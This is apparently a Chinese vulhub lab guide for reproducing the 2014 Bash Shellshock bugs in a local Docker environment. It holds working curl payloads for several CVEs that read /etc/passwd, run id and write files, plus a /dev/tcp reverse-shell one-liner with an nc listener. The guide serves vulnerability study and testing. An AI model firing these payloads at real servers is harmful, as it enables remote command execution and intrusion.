# 初始化环境配置

## 注意事项

```bash
# 建议在tmux中进行命令行操作，避免误关闭当前命令行窗口导致操作意外中断
sudo apt update && sudo apt install tmux
```

## 简单方法

```bash
# 查看当前系统版本
lsb_release -d
# Description:	Ubuntu 16.04.3 LTS

# 安装 pip
sudo apt install python-pip

# 安装compose
pip install docker-compose
```

## 优雅方法

```bash
# 安装 pip
sudo apt install python-pip

# 安装 pyenv
curl -L https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | bash

# 添加以下3行指令到 ~/.bashrc
export PATH="~/.pyenv/bin:$PATH"
eval "$(pyenv init -)"
eval "$(pyenv virtualenv-init -)"

# 安装 python 源码编译所需要依赖的lib
# ref: https://github.com/pyenv/pyenv/wiki/Common-build-problems
sudo apt update && sudo apt install -y make build-essential libssl-dev zlib1g-dev libbz2-dev \
libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev \
xz-utils tk-dev

# 安装 python 3.6.x ，此处支持版本信息 TAB+TAB 自动补全
# 如果下载时间过长，可以参考 pyenv 安装指定python版本国内镜像加速
pyenv install 3.6.4

# 安装 pipenv
pip install pipenv

# 设置 pipenv 在 bash 环境中的自动补全
# 添加 以下命令  到 ~/.bashrc
eval "$(pipenv --completion)"

# cd 到 vulhub 所在代码根目录
pyenv local 3.6.4
pipenv install docker-compose
pipenv shell

# 普通用户权限编译当前 Dockerfile 和启动容器 的注意事项
sudo $(which docker-compose) build
sudo $(which docker-compose) up -d
```

### pyenv 安装指定python版本国内镜像加速

```bash
PYENV_CACHE="~/.pyenv/cache"
PY_VER="3.6.4" # 根据需要修改为你想要安装的python版本号
PY_URL="http://mirrors.sohu.com/python/${PY_VER}/Python-${PY_VER}.tar.xz"
[ -d ${PYENV_CACHE} ] ||  mkdir -p ${PYENV_CACHE} 
cd ${PYENV_CACHE} && wget ${PY_URL}
[ $? -eq 0 ] && pyenv install ${PY_VER}
```

# 相关漏洞总结

[GNU » Bash : Security Vulnerabilities Published In 2014](https://www.cvedetails.com/vulnerability-list.php?vendor_id=72&product_id=21050&version_id=&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=2014&month=0&cweid=0&order=2&trc=6&sha=680c4355bdd4ddd349907d67b6330425f8f5c193)

# 漏洞利用复现

## 漏洞存在性证明

```bash
# 针对未打补丁的bash进行shellshock攻击可以执行任意指令
curl -H "User-Agent: () { foo;}; echo \"Content-Type: text/plain\" ; echo ; /usr/bin/id" http://127.0.0.1/victim.cgi
curl -H "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://127.0.0.1/victim.cgi
```

![](attach/img/poc-1.png)

```bash
# 针对已打补丁的bash进行shellshock攻击无效
curl -H "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://127.0.0.1/safe.cgi
curl -H "User-Agent: () { foo;}; echo \"Content-Type: text/plain\" ; echo ; /usr/bin/id" http://127.0.0.1/safe.cgi
```

![](attach/img/poc-2.png)

### CVE-2014-6271

```bash
# 以下 POC 代码执行完毕之后会在容器环境中创建文件 /tmp/poc ，且文件内容是 CVE-2014-6271 vulnerable
curl -H "User-Agent: () { :; }; echo \"Content-Type: text/plain\"; echo \"CVE-2014-6271 vulnerable\" > /tmp/poc" http://127.0.0.1/victim.cgi
```

![](attach/img/poc-CVE-2014-6271.png)

![](attach/img/poc-result-CVE-2014-6271.png)

### CVE-2014-6277

```bash
# 容器本地测试 PoC
env X='() { x() { _; }; x() { _; } <<a; }' /usr/local/bash-4.3.0/bin/bash -c :

# 以下 PoC 会导致 HTTP服务器 500错误
curl -H "User-Agent: () { x() { _; }; x() { _; } <<a; }" http://127.0.0.1/victim.cgi

# 已打补丁的CGI访问是正常的 200 HTTP响应码
curl -H "User-Agent: () { x() { _; }; x() { _; } <<a; }" http://127.0.0.1/safe.cgi
```

### CVE-2014-6278

```bash
# 容器本地测试 PoC
env X='() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }' /usr/local/bash-4.3.0/bin/bash -c :

# 远程测试 PoC-1.0
curl -H "User-Agent: () { _; } >_[\$(\$())] { id > /tmp/CVE-2014-6278.txt; }" http://127.0.0.1/victim.cgi

# 远程测试 PoC-1.1
curl -H "Cookie: () { _; } >_[\$(\$())] { id > /tmp/CVE-2014-6278.txt; }" http://127.0.0.1/victim.cgi

# 远程测试 PoC-2
time curl -H "User-Agent: () { _; } >_[\$(\$())] { sleep 5; }" http://127.0.0.1/victim.cgi
```

### CVE-2014-7169

```bash
# TODO 目前只测试验证了本地环境exploit，远程CGI环境的exploit还没有复现成功
# 以下命令执行成功后会在当前目录下创建一个名为 echo 的文件，文件内容是以下命令的执行时间
env X='() { (a)=>\' /usr/local/bash-4.3.0/bin/bash -c "echo date"; cat echo

curl -H "User-Agent: '() { (a)=>\\' /usr/local/bash-4.3.0/bin/bash -c \"echo date\"; cat echo" http://127.0.0.1/victim.cgi

# 已打补丁情况下的测试
env X='() { (a)=>\' bash -c "echo date"; cat echo
```

### CVE-2014-7186

```bash
# TODO 目前只测试验证了本地环境exploit，远程CGI环境的exploit还没有复现成功
/usr/local/bash-4.3.0/bin/bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"

# 已打补丁情况下的测试
bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"
```

### CVE-2014-7187

```bash
# TODO 目前只测试验证了本地环境exploit，本地和远程CGI环境的exploit均没有复现成功
(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | /usr/local/bash-4.3.0/bin/bash || echo "CVE-2014-7187 vulnerable, word_lineno"

# 已打补丁情况下的测试
(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"
```

## 漏洞实战利用

```bash
# 安装 nc
sudo apt update && sudo apt install netcat

# 在docker的宿主机上 nc 建立本地监听
# 在一个 tmux 窗口中开启nc监听
nc.traditional -l -p 7777

# 在另一个 tmux 窗口中发起攻击
# 建立反向连接
# 此处 docker 宿主机的容器默认网卡IP是 172.17.0.1
# 攻击成功终端没有任何回显，会“卡住”当前curl连接，最后504超时退出当前http连接但并不会影响已经建立起的反向连接
curl -H "User-Agent: () { ignored;};/usr/local/bash-4.3.0/bin/bash -i >& /dev/tcp/172.17.0.1/7777 0>&1" http://127.0.0.1/victim.cgi
```

![](attach/img/exploit-1.png)

下图是在 docker 宿主机上获得的反向连接shell执行命令的效果截图，证明我们已经拿到了远程靶机容器的一个普通用户权限shell。

![](attach/img/exploit-2.png)

# 参考资料

* [Shellshock \(software bug\)](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29)
* [Shellshocker - Repository of "Shellshock" Proof of Concept Code](https://github.com/mubix/shellshocker-pocs)
* [GNU » Bash : Security Vulnerabilities Published In 2014](https://www.cvedetails.com/vulnerability-list/vendor_id-72/product_id-21050/year-2014/GNU-Bash.html)

